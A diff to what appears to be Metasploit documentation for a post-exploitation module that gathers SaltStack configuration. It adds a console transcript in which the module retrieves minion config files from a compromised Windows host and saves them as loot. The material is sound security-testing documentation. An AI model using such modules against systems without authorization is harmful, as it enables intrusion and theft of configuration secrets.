@@ -100,6 +100,22 @@ msf6 post(multi/gather/saltstack_salt) > cat /root/.msf4/loot/20210410125036_def
 master: 444.444.4.444
 ```
 
+### Minion 3003 on Windows Server 2012
+
+```
+msf6 post(multi/gather/saltstack_salt) > rexploit
+[*] Reloading module...
+
+[!] SESSION may not be compatible with this module.
+[*] Looking for salt minion config files
+[+] Minion master: 1.1.1.1
+[+] 2.2.2.2:49299 - minion file successfully retrieved and saved to /home/h00die/.msf4/loot/20210502093836_default_2.2.2.2_saltstack_minion_337783.bin
+[*] Looking for salt minion config files
+[+] Minion master: 1.1.1.1
+[+] 2.2.2.2:49299 - minion file successfully retrieved and saved to /home/h00die/.msf4/loot/20210502093837_default_2.2.2.2_saltstack_minion_063036.bin
+[*] Post module execution completed
+```
+
 ### Master 3002.2 on Ubuntu 20.04
 
 #### Setup
